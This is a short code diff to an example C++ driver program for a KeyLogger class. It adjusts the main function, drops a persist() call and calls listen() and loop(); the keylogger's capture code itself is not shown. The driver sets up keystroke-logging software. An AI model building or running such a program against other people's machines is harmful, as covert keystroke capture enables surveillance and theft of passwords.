@@ -4,14 +4,16 @@ Example standalone program using the KeyLogger class
 
 #include "keylogger.h"
 
+using namespace std;
 
-int main(int argc, char *argv[]) {
-
+//int wWinMain(HINSTANCE hInst, HINSTANCE prevInst, LPWSTR szCmdLine, int nCmdShow)
+int main()
+{
 	KeyLogger* kl = KeyLogger::getInstance();
 
-	kl->persist();
+	kl->listen();
 
-    kl->listen();
+	kl->loop();
 
 	return 0;
 }
